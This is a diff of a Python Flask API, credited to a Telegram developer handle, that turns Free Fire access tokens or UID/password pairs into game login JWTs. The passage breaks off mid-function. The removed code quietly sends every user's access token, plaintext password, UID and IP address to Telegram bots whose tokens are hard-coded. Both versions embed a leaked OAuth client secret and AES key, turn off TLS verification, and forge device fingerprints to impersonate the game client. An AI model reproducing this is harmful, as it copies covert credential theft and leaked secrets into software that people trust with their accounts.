@@ -1,557 +1,312 @@
-from flask import Flask, request, jsonify
-import requests
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-import os
-import base64
 import json
-from datetime import datetime, timezone, timedelta
+import requests
 import time
-import threading
-import my_pb2
-import output_pb2
-from google.protobuf import json_format
-import FreeFire_pb2
+import sys
+import os
+from flask import Flask, request, jsonify, Response
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from urllib.parse import urlparse, parse_qs
+
+# -------------------- Include protobuf generated code --------------------
+from google.protobuf import descriptor as _descriptor
+from google.protobuf import descriptor_pool as _descriptor_pool
+from google.protobuf import symbol_database as _symbol_database
+from google.protobuf.internal import builder as _builder
+from google.protobuf.message import Message
+
+_sym_db = _symbol_database.Default()
 
 app = Flask(__name__)
-SESSION = requests.Session()
-KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+app.json.sort_keys = False
 
-LOGIN_URL = "https://loginbp.ppmainecoonghj.com/"
-CLIENT_URL = "https://clientbp.ppmainecoonghj.com/"
-RELEASEVERSION = "OB55"
-USERAGENT = "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"
+# --- MajorLoginReq protobuf ---
+DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
 
-# ================== TELEGRAM LOG CONFIG ==================
-# Bot 1 -> /access-to-jwt logs
-BOT1_TOKEN = os.environ.get("BOT1_TOKEN", "8343621346:AAFlmgSxYMP_sCVzb8XIRdNvnhYpKT0fh2I")
-BOT1_CHAT_ID = os.environ.get("BOT1_CHAT_ID", "8844417210")
+_globals = globals()
+_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
+_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'MajorLoginReq_pb2', _globals)
 
-# Bot 2 -> /token logs
-BOT2_TOKEN = os.environ.get("BOT2_TOKEN", "8858989291:AAHdBveVFNyIhvXlgatQlyHMR36kMUmB9-8")
-BOT2_CHAT_ID = os.environ.get("BOT2_CHAT_ID", "8844417210")
+class ThunderFFMock:
+    pass
 
-PLATFORM_MAP = {
-    3: "Facebook",
-    4: "Guest",
-    5: "VK",
-    8: "Google",
-    10: "AppleId",
-    11: "X (Twitter)"
-}
+thunderFF_pb2 = ThunderFFMock()
+thunderFF_pb2.MajorLoginReq = _globals['MajorLogin']
+thunderFF_pb2.GameSecurity = _globals['GameSecurity']
 
-def log_debug(message):
-    print(f"[DEBUG] {message}")
+# --- MajorLoginRes protobuf ---
+DESCRIPTOR2 = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"|\n\rMajorLoginRes\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03url\x18\n \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0b\n\x03key\x18\x16 \x01(\x0c\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3')
+_globals2 = globals()
+_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR2, _globals2)
+_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR2, 'MajorLoginRes_pb2', _globals2)
+thunderFF_pb2.MajorLoginRes = _globals2['MajorLoginRes']
 
-def log_error(message):
-    print(f"[ERROR] {message}")
+# AES constants
+AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
-def log_info(message):
-    print(f"[INFO] {message}")
+async def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.encrypt(pad(data, AES.block_size))
 
-# ================== TELEGRAM SENDER ==================
-def send_telegram_message(bot_token, chat_id, text):
-    """Send message to Telegram bot (non-blocking)."""
-    def _send():
-        try:
-            if not bot_token or "YOUR_BOT" in bot_token or not chat_id or "YOUR_BOT" in str(chat_id):
-                log_error("Telegram bot token/chat_id not configured, skipping forward.")
-                return
-            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-            payload = {
-                "chat_id": chat_id,
-                "text": text,
-                "parse_mode": "HTML",
-                "disable_web_page_preview": True
-            }
-            r = requests.post(url, data=payload, timeout=15)
-            if r.status_code != 200:
-                log_error(f"Telegram send failed ({r.status_code}): {r.text[:200]}")
-            else:
-                log_debug("Telegram log sent successfully.")
-        except Exception as e:
-            log_error(f"Telegram send exception: {e}")
+import traceback
+import ssl
+import asyncio
+from datetime import datetime
+import aiohttp
 
-    threading.Thread(target=_send, daemon=True).start()
-
-def escape_html(text: str) -> str:
-    if text is None:
-        return ""
-    return (str(text)
-            .replace("&", "&amp;")
-            .replace("<", "&lt;")
-            .replace(">", "&gt;"))
-
-def build_telegram_log(title: str, fields: dict) -> str:
-    lines = [f"<b>{escape_html(title)}</b>", ""]
-    for k, v in fields.items():
-        if v is None or v == "":
-            continue
-        lines.append(f"<b>{escape_html(k)}:</b> <code>{escape_html(v)}</code>")
-    lines.append("")
-    lines.append(f"🕒 <b>UTC:</b> <code>{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC</code>")
-    ist = datetime.utcnow() + timedelta(hours=5, minutes=30)
-    lines.append(f"🕒 <b>IST:</b> <code>{ist.strftime('%Y-%m-%d %H:%M:%S')} IST</code>")
-    return "\n".join(lines)
-
-# ================== EXISTING LOGIC ==================
-def convert_timestamp_to_human_readable(timestamp_seconds: int):
+async def build_majorlogin_payload(open_id, access_token, platform, client_version, device_info):
     try:
-        utc_time = datetime.fromtimestamp(timestamp_seconds, tz=timezone.utc)
-        ist_offset = timedelta(hours=5, minutes=30)
-        ist_time = utc_time + ist_offset
-
-        current_time = int(time.time())
-        time_remaining = timestamp_seconds - current_time
-
-        days = time_remaining // (24 * 3600)
-        hours = (time_remaining % (24 * 3600)) // 3600
-        minutes = (time_remaining % 3600) // 60
-        seconds = time_remaining % 60
-        is_expired = time_remaining <= 0
-
-        return {
-            "timestamp": timestamp_seconds,
-            "utc_time": utc_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
-            "ist_time": ist_time.strftime("%Y-%m-%d %H:%M:%S IST"),
-            "time_remaining_seconds": time_remaining,
-            "time_remaining_human": f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds" if time_remaining > 0 else "Expired",
-            "is_expired": is_expired,
-            "days_remaining": days if not is_expired else 0,
-            "hours_remaining": hours if not is_expired else 0,
-            "minutes_remaining": minutes if not is_expired else 0,
-            "seconds_remaining": seconds if not is_expired else 0
-        }
+        proto = thunderFF_pb2.MajorLoginReq()
+        proto.event_time = str(datetime.now())[:-7]
+        proto.game_name = "free fire"
+        proto.platform_id = int(platform)
+        
+        proto.client_version = "1.132.1"
+        proto.client_version_code = "2019116753"
+        proto.platform_sdk_id = 1
+        proto.login_by = 3
+        proto.login_open_id_type = int(platform)
+        proto.open_id_type = str(platform)
+        proto.origin_platform_type = str(platform)
+        proto.primary_platform_type = str(platform)
+        
+        proto.system_software = str(device_info.get("system_software", "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"))
+        proto.system_hardware = str(device_info.get("brand", "Handheld"))
+        proto.device_type = str(device_info.get("model", "Handheld"))
+        proto.screen_width = int(device_info.get("screen_width", 1920))
+        proto.screen_height = int(device_info.get("screen_height", 1080))
+        proto.screen_dpi = str(device_info.get("screen_dpi", "280"))
+        proto.processor_details = str(device_info.get("processor_details", "ARM64 FP ASIMD AES VMH | 2865 | 4"))
+        proto.memory = int(device_info.get("memory", 3003))
+        proto.gpu_renderer = str(device_info.get("gpu_renderer", "Adreno (TM) 640"))
+        proto.gpu_version = "OpenGL ES 3.1 v1.46"
+        proto.unique_device_id = str(device_info.get("unique_device_id", "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"))
+        proto.client_ip = str(device_info.get("client_ip", "223.191.51.89"))
+        
+        proto.telecom_operator = "Verizon"
+        proto.network_operator_a = "Verizon"
+        proto.network_type = "WIFI"
+        proto.network_type_a = "WIFI"
+        proto.cpu_type = 2
+        proto.cpu_architecture = "64"
+        proto.graphics_api = "OpenGLES2"
+        proto.language = "en"
+        proto.open_id = str(open_id)
+        proto.access_token = str(access_token)
+        proto.reg_avatar = 1
+        proto.channel_type = 3
+        
+        if hasattr(proto, "memory_available"):
+            proto.memory_available.version = 55
+            proto.memory_available.hidden_value = 81
+        
+        proto.external_storage_total = 36235
+        proto.external_storage_available = 31335
+        proto.internal_storage_total = 2519
+        proto.internal_storage_available = 703
+        proto.game_disk_storage_total = 26628
+        proto.game_disk_storage_available = 25010
+        proto.external_sdcard_total_storage = 36235
+        proto.external_sdcard_avail_storage = 32992
+        
+        proto.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
+        proto.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
+        proto.client_using_version = "7428b253defc164018c604a1ebbfebdf"
+        proto.supported_astc_bitset = 16383
+        proto.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWAUOUgsvA1snWlBaO1kFYg=="
+        proto.loading_time = 13564
+        proto.release_channel = "android"
+        proto.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
+        proto.android_engine_init_flag = 110009
+        proto.if_push = 1
+        proto.is_vpn = 0
+        
+        payload = proto.SerializeToString()
+        return await aes_encrypt(payload, AES_KEY, AES_IV)
     except Exception as e:
-        log_error(f"Error converting timestamp: {e}")
-        return {
-            "timestamp": timestamp_seconds,
-            "utc_time": "Invalid timestamp",
-            "ist_time": "Invalid timestamp",
-            "time_remaining_seconds": 0,
-            "time_remaining_human": "Invalid timestamp",
-            "is_expired": True,
-            "error": str(e)
-        }
-
-def get_token_inspect_data(access_token: str):
-    try:
-        resp = SESSION.get(
-            f"https://ffmconnect.live.gop.garenanow.com/oauth/token/inspect?token={access_token}",
-            timeout=15,
-            verify=False
-        )
-        data = resp.json()
-
-        if 'open_id' in data and 'platform' in data and 'uid' in data:
-            if 'expiry_time' in data:
-                data['expiry_info'] = convert_timestamp_to_human_readable(data['expiry_time'])
-            elif 'expires_in' in data:
-                expires_at = int(time.time()) + data['expires_in']
-                data['expiry_info'] = convert_timestamp_to_human_readable(expires_at)
-            return data
-    except Exception as e:
-        log_error(f"Error inspecting token: {e}")
-    return None
-
-def decode_jwt_token(jwt_token: str):
-    try:
-        parts = jwt_token.split('.')
-        if len(parts) != 3:
-            return None
-
-        payload = parts[1]
-        padding = 4 - (len(payload) % 4)
-        if padding != 4:
-            payload += '=' * padding
-
-        decoded_bytes = base64.urlsafe_b64decode(payload)
-        payload_data = json.loads(decoded_bytes.decode('utf-8'))
-
-        if 'exp' in payload_data:
-            payload_data['expiry_info'] = convert_timestamp_to_human_readable(payload_data['exp'])
-        if 'iat' in payload_data:
-            payload_data['issued_at_info'] = convert_timestamp_to_human_readable(payload_data['iat'])
-
-        return payload_data
-    except Exception as e:
-        log_error(f"Error decoding JWT token: {e}")
+        print(f"[-] Error building MajorLogin payload: {e}")
+        traceback.print_exc()
         return None
 
-def find_protobuf_start(data: bytes) -> int:
-    idx = data.find(b'\x12\x03IND')
-    if idx != -1:
-        for i in range(idx - 1, max(idx - 20, -1), -1):
-            if data[i] == 0x08:
-                return i
-
-    jwt_marker = data.find(b'B\xe7\x05eyJ')
-    if jwt_marker != -1:
-        for i in range(jwt_marker - 1, max(jwt_marker - 200, -1), -1):
-            if data[i] == 0x08:
-                return i
-
-    return data.find(b'\x08')
-
-def login(uid, access_token, open_id, platform_type):
-    log_debug(f"Starting login for UID {uid} with platform_type {platform_type}")
-
-    url = f"{LOGIN_URL}MajorLogin"
-
-    game_data = my_pb2.GameData()
-    game_data.timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
-    game_data.game_name = "Free Fire"
-    game_data.game_version = 1
-    game_data.version_code = "1.126.2"
-    game_data.os_info = "iOS 18.4"
-    game_data.device_type = "Handheld"
-    game_data.network_provider = "Verizon Wireless"
-    game_data.connection_type = "WIFI"
-    game_data.screen_width = 1170
-    game_data.screen_height = 2532
-    game_data.dpi = "460"
-    game_data.cpu_info = "Apple A15 Bionic"
-    game_data.total_ram = 6144
-    game_data.gpu_name = "Apple GPU (5-core)"
-    game_data.gpu_version = "Metal 3"
-    game_data.user_id = str(uid)
-    game_data.ip_address = "172.190.111.97"
-    game_data.language = "en"
-    game_data.open_id = str(open_id)
-    game_data.access_token = str(access_token)
-    game_data.platform_type = int(platform_type)
-    game_data.field_99 = str(platform_type)
-    game_data.field_100 = str(platform_type)
-
-    serialized_data = game_data.SerializeToString()
-    padded_data = pad(serialized_data, AES.block_size)
-    cipher = AES.new(KEY, AES.MODE_CBC, IV)
-    encrypted_data = cipher.encrypt(padded_data)
-
-    headers = {
-        'User-Agent': USERAGENT,
-        'Accept': "*/*",
-        'Accept-Encoding': "deflate, gzip",
-        'X-Ga-Sv': "1789534056",
-        'Authorization': "Bearer",
-        'X-Ga': "v1 1",
-        'Releaseversion': RELEASEVERSION,
-        'Content-Type': "application/x-www-form-urlencoded",
-        'X-Unity-Version': "2018.4.12f1",
-        'PlAy_VeR': "1.132.1",
-        'Ob_VeR': RELEASEVERSION
-    }
-
+async def send_majorlogin(data, release_version, access_token, server_url):
     try:
-        response = SESSION.post(url, data=encrypted_data, headers=headers, timeout=30, verify=False)
+        url = f"{server_url}MajorLogin"
+        req_headers = {
+            'User-Agent': "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
+            'Accept': "*/*",
+            'Accept-Encoding': "deflate, gzip",
+            'X-Ga-Sv': "1789534056",
+            'Authorization': f"Bearer {access_token}",
+            'X-Ga': "v1 1",
+            'Releaseversion': str(release_version),
+            'Content-Type': "application/octet-stream",
+            'X-Unity-Version': "2018.4.12f1",
+            'PlAy_VeR': "1.132.1",
+            'Ob_VeR': str(release_version),
+            'LoGiN_UrL': url
+        }
+        
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
 
-        if response.status_code == 200:
-            start_idx = find_protobuf_start(response.content)
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, headers=req_headers, data=data, ssl=ssl_context) as response:
+                if response.status != 200:
+                    return None
+                    
+                response_content = await response.read()
+                if not response_content or len(response_content) < 20:
+                    return None
 
-            if start_idx == -1:
-                log_error(f"Protobuf start not found. Raw: {response.content[:300]}")
-                return None
+                try:
+                    res_proto = thunderFF_pb2.MajorLoginRes()
+                    res_proto.ParseFromString(response_content)
+                    if getattr(res_proto, "region", None) and getattr(res_proto, "token", None):
+                        return res_proto
+                except Exception:
+                    pass
 
-            proto_data = response.content[start_idx:]
-            log_debug(f"Protobuf starts at index {start_idx}")
+                if len(response_content) > 64:
+                    try:
+                        res_proto = thunderFF_pb2.MajorLoginRes()
+                        res_proto.ParseFromString(response_content[64:])
+                        if getattr(res_proto, "region", None) and getattr(res_proto, "token", None):
+                            return res_proto
+                    except Exception:
+                        pass
 
-            jwt_msg = output_pb2.Garena_420()
-            try:
-                jwt_msg.ParseFromString(proto_data)
-                if jwt_msg.token:
-                    log_debug(f"Login successful for UID {uid}")
-                    return jwt_msg.token
-            except Exception as parse_err:
-                log_error(f"Failed to parse protobuf: {parse_err}")
-                return None
-        else:
-            error_text = response.content.decode().strip()
-            log_debug(f"API MajorLogin returned status {response.status_code}: {error_text}")
+                for offset in range(min(128, len(response_content))):
+                    try:
+                        candidate = thunderFF_pb2.MajorLoginRes()
+                        candidate.ParseFromString(response_content[offset:])
+                        if getattr(candidate, "region", None) and getattr(candidate, "token", None):
+                            return candidate
+                    except Exception:
+                        continue
 
-            if error_text == "BR_PLATFORM_INVALID_PLATFORM":
-                return {"error": "INVALID_PLATFORM", "message": "this account is registered on another platform"}
-            elif error_text == "BR_GOP_TOKEN_AUTH_FAILED":
-                return {"error": "INVALID_TOKEN", "message": "AccessToken invalid."}
-            elif error_text == "BR_PLATFORM_INVALID_OPENID":
-                return {"error": "INVALID_OPENID", "message": "OpenID invalid."}
-
+                fallback_proto = thunderFF_pb2.MajorLoginRes()
+                fallback_proto.ParseFromString(response_content)
+                return fallback_proto
+                
     except Exception as e:
-        log_error(f"UID {uid}: Error in JWT request - {e}")
+        return None
 
-    return None
-
-def get_access_token(account: str):
-    url = "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant"
-    payload = account + "&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
-    headers = {
-        'User-Agent': USERAGENT,
-        'Connection': "Keep-Alive",
-        'Accept-Encoding': "gzip",
-        'Content-Type': "application/x-www-form-urlencoded"
-    }
-    with requests.Session() as client:
-        resp = client.post(url, data=payload, headers=headers, verify=False)
-        data = resp.json()
-        return data.get("access_token", "0"), data.get("open_id", "0")
-
-def generate_jwt_token_with_uid_password(uid: str, password: str):
-    account = f"uid={uid}&password={password}"
-
-    token_val, open_id = get_access_token(account)
-
-    if token_val == "0" or open_id == "0":
-        raise Exception("Invalid UID or Password — access token not received")
-
-    body = json.dumps({
-        "open_id": open_id,
-        "open_id_type": "4",
-        "login_token": token_val,
-        "orign_platform_type": "4"
-    })
-
-    proto_bytes = json_to_proto(body, FreeFire_pb2.LoginReq())
-    encrypted_payload = aes_cbc_encrypt(KEY, IV, proto_bytes)
-
-    url = f"{LOGIN_URL}MajorLogin"
-    headers = {
-        'User-Agent': USERAGENT,
-        'Accept': "*/*",
-        'Accept-Encoding': "deflate, gzip",
-        'X-Ga-Sv': "1789534056",
-        'Authorization': "Bearer",
-        'X-Ga': "v1 1",
-        'Releaseversion': RELEASEVERSION,
-        'Content-Type': "application/x-www-form-urlencoded",
-        'X-Unity-Version': "2018.4.12f1",
-        'PlAy_VeR': "1.132.1",
-        'Ob_VeR': RELEASEVERSION
-    }
-
-    with requests.Session() as client:
-        resp = client.post(url, data=encrypted_payload, headers=headers, verify=False)
-
-        print(f"=== HTTP {resp.status_code} | Content-Length: {len(resp.content)} ===")
-
-        start_idx = find_protobuf_start(resp.content)
-
-        if start_idx == -1:
-            raise Exception(f"Protobuf start not found. Raw: {resp.content[:300]}")
-
-        proto_data = resp.content[start_idx:]
-        print(f"=== Protobuf starts at index {start_idx} ===")
-
-        try:
-            msg = json.loads(json_format.MessageToJson(
-                decode_protobuf(proto_data, FreeFire_pb2.LoginRes)
-            ))
-        except Exception as parse_err:
-            raise Exception(
-                f"Failed to parse LoginRes from index {start_idx}. "
-                f"Raw (from start): {resp.content[start_idx:start_idx+300]}. "
-                f"Error: {parse_err}"
-            )
-
-        response_data = {
-            "account_Id": msg.get("accountId", ""),
-            "agoraEnvironment": msg.get("agoraEnvironment", "live"),
-            "ipRegion": msg.get("ipRegion", ""),
-            "lockRegion": msg.get("lockRegion", ""),
-            "region": msg.get("notiRegion", ""),
-            "serverUrl": msg.get("serverUrl", ""),
-            "token": f"{msg.get('token', '')}"
-        }
-
-        return response_data
-
-def decode_protobuf(encoded_data: bytes, message_type):
-    instance = message_type()
-    instance.ParseFromString(encoded_data)
-    return instance
-
-def json_to_proto(json_data: str, proto_message) -> bytes:
-    json_format.ParseDict(json.loads(json_data), proto_message)
-    return proto_message.SerializeToString()
-
-def aes_cbc_encrypt(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
-    padded = pad(plaintext, AES.block_size)
-    aes = AES.new(key, AES.MODE_CBC, iv)
-    return aes.encrypt(padded)
-
-# ================== ROUTES ==================
-
-@app.route('/access-to-jwt', methods=['GET'])
-def access_to_jwt():
-    """Convert access_token to JWT token"""
-    access_token = request.args.get('access_token')
-
-    if not access_token:
-        return jsonify({
-            "success": False,
-            "error": "MISSING_PARAMETER",
-            "message": "access_token parameter is required"
-        }), 400
-
-    token_data = get_token_inspect_data(access_token)
-
-    if not token_data:
-        return jsonify({
-            "success": False,
-            "error": "INVALID_TOKEN",
-            "message": "AccessToken is invalid or expired"
-        }), 400
-
-    open_id = token_data.get('open_id')
-    platform_type = token_data.get('platform', 4)
-    uid = token_data.get('uid')
-
-    uid_str = str(uid) if uid else ""
-    platform_type_int = int(platform_type) if platform_type else 4
-    open_id_str = str(open_id) if open_id else ""
-
-    if not open_id_str:
-        return jsonify({
-            "success": False,
-            "error": "MISSING_DATA",
-            "message": "Could not extract open_id from access_token"
-        }), 400
-
-    jwt_token = login(uid_str, access_token, open_id_str, platform_type_int)
-
-    if isinstance(jwt_token, dict) and 'error' in jwt_token:
-        return jsonify({
-            "success": False,
-            "error": jwt_token.get("error"),
-            "message": jwt_token.get("message")
-        }), 400
-
-    if not jwt_token:
-        return jsonify({
-            "success": False,
-            "error": "JWT_GENERATION_FAILED",
-            "message": "Failed to generate JWT token. Account may be unregistered or banned."
-        }), 500
-
-    decoded_token = decode_jwt_token(jwt_token)
-    platform_name = PLATFORM_MAP.get(platform_type_int, "Unknown")
-
-    current_time = datetime.now(timezone.utc)
-    current_ist = current_time + timedelta(hours=5, minutes=30)
-
-    response_data = {
-        "success": True,
-        "access_token": access_token,
-        "jwt_token": jwt_token,
-        "decoded_jwt": decoded_token if decoded_token else {},
-        "user_info": {
-            "uid": uid_str,
-            "open_id": open_id_str,
-            "platform_type": platform_type_int,
-            "platform_name": platform_name,
-        },
-        "current_time": {
-            "utc": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
-            "ist": current_ist.strftime("%Y-%m-%d %H:%M:%S IST"),
-            "timestamp": int(time.time())
-        },
-        "credits": {
-            "developer": "@UditGaming45",
-            "main_channel": "@",
-            "apis_channel": "@5"
-        }
-    }
-
-    if 'expiry_info' in token_data:
-        response_data['access_token_expiry'] = token_data['expiry_info']
-
-    # ============ FORWARD SUCCESS LOG TO BOT 1 ============
+def format_login_result(res_proto):
+    if not res_proto:
+        return None
     try:
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        log_text = build_telegram_log(
-            "✅ ACCESS-TO-JWT SUCCESS",
-            {
-                "🔑 Access Token": access_token,
-                "👤 UID": uid_str,
-                "🆔 Open ID": open_id_str,
-                "📱 Platform": f"{platform_name} ({platform_type_int})",
-                "🌐 Client IP": client_ip
-            }
-        )
-        send_telegram_message(BOT1_TOKEN, BOT1_CHAT_ID, log_text)
-    except Exception as log_err:
-        log_error(f"Failed forwarding to Bot1: {log_err}")
-
-    return jsonify(response_data)
-
-
-@app.route('/token', methods=['GET'])
-def get_jwt_token():
-    """Generate JWT token from UID and password"""
-    uid = request.args.get('uid')
-    password = request.args.get('password')
-
-    if not uid or not password:
-        return jsonify({
-            "success": False,
-            "error": "MISSING_PARAMETER",
-            "message": "Both uid and password parameters are required"
-        }), 400
-
-    try:
-        token_data = generate_jwt_token_with_uid_password(uid, password)
-
-        token_data['success'] = True
-        token_data['credits'] = {
-            "developer": "@UditGaming45",
-            "main_channel": "",
-            "apis_channel": "@5"
+        token = getattr(res_proto, "token", "")
+        if not token:
+            return None
+        return {
+            "account_uid": str(getattr(res_proto, "account_uid", "")),
+            "region": getattr(res_proto, "region", ""),
+            "token": token,
+            "url": getattr(res_proto, "url", ""),
+            "timestamp": getattr(res_proto, "timestamp", 0),
+            "key": getattr(res_proto, "key", b"").hex(),
+            "iv": getattr(res_proto, "iv", b"").hex()
         }
+    except Exception:
+        return None
 
-        # ============ FORWARD SUCCESS LOG TO BOT 2 ============
-        try:
-            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            log_text = build_telegram_log(
-                "✅ UID-PASSWORD TOKEN SUCCESS",
-                {
-                    "👤 UID": uid,
-                    "🔒 Password": password,
-                    "🆔 Account ID": token_data.get("account_Id", ""),
-                    "🌍 Region": token_data.get("region", ""),
-                    "🌐 Client IP": client_ip
-                }
-            )
-            send_telegram_message(BOT2_TOKEN, BOT2_CHAT_ID, log_text)
-        except Exception as log_err:
-            log_error(f"Failed forwarding to Bot2: {log_err}")
-
-        return jsonify(token_data), 200
+def try_major_login(open_id: str, access_token: str, platform_type: int):
+    async def _wrapper():
+        device_info = {}
+        payload = await build_majorlogin_payload(open_id, access_token, platform_type, "1.132.1", device_info)
+        if not payload:
+            return None
+        res_proto = await send_majorlogin(payload, "OB55", access_token, "https://loginbp.ppmainecoonghj.com/")
+        return format_login_result(res_proto)
+    
+    try:
+        return asyncio.run(_wrapper())
     except Exception as e:
-        log_error(f"Failed to generate token: {str(e)}")
-        return jsonify({
-            "success": False,
-            "error": "TOKEN_GENERATION_FAILED",
-            "message": f"Failed to generate token: {str(e)}"
-        }), 500
+        return None
 
-
-@app.route('/')
-def index():
+@app.route("/access-to-jwt", methods=["GET"])
+def rizer_endpoint():
+  access_token = request.args.get("access_token")
+  if not access_token:
     return jsonify({
-        "success": True,
-        "message": "Free Fire Token Converter API",
-        "endpoints": {
-            "/access-to-jwt": "Convert access_token to JWT token",
-            "/token": "Generate JWT token using UID and password"
-        },
-        "credits": {
-            "developer": "@UditGaming45",
-            "main_channel": "@mukeshhere",
-            "apis_channel": "@mukeshhhhhk"
-        }
-    })
+        "success": False,
+        "error": "MISSING_PARAMETER",
+        "message": "access_token parameter is required"
+    }), 400
 
+  inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
+  try:
+    insp_resp = requests.get(inspect_url, timeout=10)
+    insp_data = insp_resp.json() if insp_resp.status_code == 200 else {}
+    open_id = insp_data.get("open_id")
+    uid = insp_data.get("uid", "")
+    platform_type = insp_data.get("platform", 4)
+
+    if not open_id:
+      return jsonify({
+          "success": False,
+          "error": "INVALID_TOKEN",
+          "message": "AccessToken is invalid or expired"
